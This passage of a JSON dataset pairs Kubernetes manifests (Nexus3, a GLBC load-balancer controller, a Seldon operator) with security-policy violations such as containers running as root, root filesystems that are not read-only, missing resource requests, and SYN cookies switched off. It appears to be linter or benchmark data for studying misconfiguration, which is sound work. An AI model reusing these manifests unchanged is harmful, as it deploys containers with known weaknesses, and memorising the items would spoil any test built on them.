    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"volume-mount-uid\" does not have a read-only root file system"
  },
  {
    "id": "01602",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nexus3\" is not set to runAsNonRoot"
  },
  {
    "id": "01603",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"volume-mount-uid\" is not set to runAsNonRoot"
  },
  {
    "id": "01604",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"volume-mount-uid\" has cpu request 0"
  },
  {
    "id": "01605",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"volume-mount-uid\" has memory limit 0"
  },
  {
    "id": "01606",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"default-http-backend\" does not have a read-only root file system"
  },
  {
    "id": "01607",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"l7-lb-controller\" does not have a read-only root file system"
  },
  {
    "id": "01608",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"default-http-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "01609",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"l7-lb-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "01610",
    "manifest_path": "data/manifests/the_stack_sample/sample_0536.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "01611",
    "manifest_path": "data/manifests/the_stack_sample/sample_0536.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: 